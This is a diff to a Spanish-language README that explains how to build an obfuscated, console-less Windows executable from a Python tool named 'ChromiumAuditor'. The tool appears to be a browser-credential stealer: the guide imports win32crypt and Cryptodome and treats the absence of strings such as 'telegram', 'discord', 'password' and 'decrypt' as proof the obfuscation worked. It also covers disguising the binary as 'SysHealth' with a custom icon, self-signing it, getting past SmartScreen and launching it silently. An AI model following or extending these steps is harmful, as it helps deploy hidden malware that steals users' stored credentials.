@@ -107,31 +107,20 @@ strings main.py | grep -E "(telegram|discord|http|password|decrypt)"
 # Si no devuelve nada relevante, la ofuscación fue exitosa ✅
 ```
 
-### Paso 3: Compilación Blindada (.exe)
+### Paso 3: Compilación Robusta y Ofuscada (.exe)
 
-#### Opción A — PyArmor + PyInstaller (Máxima protección)
-
-```bash
-# Instalar si no están disponibles
-pip install pyarmor pyinstaller
-
-# Compilación híbrida en un solo comando
-pyarmor pack -e " --onefile --noconsole --name 'ChromiumAuditor' " main.py
-```
-
-El ejecutable resultante estará en `dist/ChromiumAuditor.exe`.
-
-#### Opción B — Solo PyInstaller (Más compatible, menos protegido)
+Para simplificar el proceso y evitar errores de compatibilidad entre versiones de PyArmor, utiliza el script **`build.py`**. Este script detecta automáticamente tu entorno y aplica las mejores prácticas de compilación.
 
 ```bash
-pyinstaller --onefile --noconsole --name "ChromiumAuditor" \
-            --hidden-import=Cryptodome \
-            --hidden-import=win32crypt \
-            main.py
+# Recomendado: Un solo archivo, sin consola, con nombre e icono personalizado
+python build.py --name "SysHealth" --icon "icono.ico" --onefile --noconsole
+
+# Para una compilación rápida sin ofuscación (solo PyInstaller)
+python build.py --no-obf --name "ChromiumAuditor"
 ```
 
 > [!TIP]
-> Si PyInstaller falla con `ModuleNotFoundError` en tiempo de ejecución, añade `--collect-all pycryptodomex` y `--collect-all win32crypt` al comando.
+> El ejecutable resultante estará en la carpeta `dist/` (o la que especifiques con `--dist-dir`).
 
 #### Reducir el tamaño del .exe (opcional)
 
@@ -213,7 +202,7 @@ start /b ChromiumAuditor.exe
 | `ModuleNotFoundError: Cryptodome` al ejecutar el .exe | PyInstaller no empaquetó la librería | Añadir `--collect-all pycryptodomex` |
 | `ModuleNotFoundError: win32api` | PyWin32 no se incluyó | Añadir `--hidden-import=win32api --hidden-import=win32con` |
 | El .exe se abre y se cierra instantáneamente | Error silencioso — falta el log | Compilar **con** `--console` primero para ver el error exacto |
-| PyArmor falla con `RuntimeError` | Versión incompatible | Usar `pyarmor==7.x` o probar directamente con PyInstaller |
+| PyArmor falla con `RuntimeError` | Versión incompatible o error de PATH | Usar el script **`build.py`** que resuelve esto automáticamente |
 | `osslsigncode: command not found` | No instalado | `sudo apt install osslsigncode` en WSL |
 | SmartScreen bloquea el .exe | Certificado autofirmado | Clic en "Más información → Ejecutar de todas formas" (esperado con self-signed) |
 
